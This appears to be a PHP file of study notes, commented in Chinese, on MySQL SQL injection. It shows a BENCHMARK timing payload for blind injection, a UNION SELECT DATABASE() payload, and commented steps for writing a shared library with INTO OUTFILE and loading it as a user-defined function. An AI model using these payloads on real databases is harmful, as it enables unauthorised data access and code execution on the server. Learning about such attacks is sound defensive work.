<?php
	/*SQL注入-查看SQLMap 177*/

	//Timing Attack (盲注)
	//利用数据库函数来进行恒成立公式
	$t = " SELECT BENCHMARK(1,ENCODE('hello','byebye')) ; " ;
	//BENCHMARK(次数,表达式),通过响应时间来判断是否存在对应的数据 
	//system_user() ;  DATABASE() ; CURRENT_USER() ; LAST_INSERT_ID();
	$taSql = " seleect * from user " ;
	$taIllSql = " union  select database()" ;
	$taIllAll = " SELECT user_id FROM `user` UNION SELECT DATABASE() " ;
	//当执行 $taIllAll 时,会获取当前数据库信息

	//创建mysql UDF(user_define_function)(用户自定义函数)
	//根据MySQL不同的版本可以通过UDF获取对应的数据库信息
	//SELECT * FROM `user` WHERE user_id= 51 INTO OUTFILE '/test1.so';
    //CREATE FUNCTION test RETURNS INTEGER SONAME '/test1.so' ;
    //SELECT * FROM mysql.func ;
